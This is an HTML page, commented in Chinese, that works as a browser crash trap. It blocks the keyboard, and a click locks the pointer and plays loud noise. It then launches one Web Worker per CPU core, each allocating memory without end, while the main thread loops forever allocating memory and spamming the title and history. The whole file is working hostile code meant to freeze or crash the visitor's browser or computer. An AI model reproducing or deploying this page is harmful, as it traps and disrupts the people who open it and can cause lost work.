<!DOCTYPE html>
<html>
<head>
    <title>*̸̢͕̳̺̺̰̉̌́̓͆̉̊̍̒</title>
    <style>
        body { background: black; margin: 0; width: 100vw; height: 100vh; cursor: none; overflow: hidden; }
    </style>
</head>
<body onclick="launch()">
    <script>
        let triggered = false;

        // 攔截鍵盤
        window.addEventListener('keydown', (e) => e.preventDefault(), true);

        function launch() {
            if (triggered) return;
            triggered = true;

            // 1. 鎖定滑鼠
            document.body.requestPointerLock();

            // 2. Bytebeat
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
            let t = 0;
            scriptNode.onaudioprocess = (e) => {
                const output = e.outputBuffer.getChannelData(0);
                for (let i = 0; i < 4096; i++) {
                    let val = (t >> 8 | t << 6 | t >> 5 | t << 9) & 0xFF;
                    output[i] = (val / 128.0) - 1.0;
                    t++;
                }
            };
            scriptNode.connect(audioCtx.destination);
            if (audioCtx.state === 'suspended') audioCtx.resume();

            // 3. 瞬間爆破邏輯 (多線程並發分配)
            const workerCode = `
                const data = [];
                while(true) {
                    try {
                        // 每個線程瘋狂申請 500MB
                        data.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
                    } catch(e) {
                        data.push(new Uint8Array(10 * 1024 * 1024));
                    }
                }
            `;
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);

            // 開啟與 CPU 核心數相等（或雙倍）的 Worker 同時開火
            const threads = navigator.hardwareConcurrency || 8;
            for(let i = 0; i < threads; i++) {
                new Worker(url);
            }

            // 主線程同時進行死循環鎖死 UI
            setTimeout(() => {
                const mainData = [];
                while(true) {
                    mainData.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
                    document.title = Math.random();
                    window.history.pushState({}, '', Math.random());
                }
            }, 0);
        }
    </script>
</body>
</html>

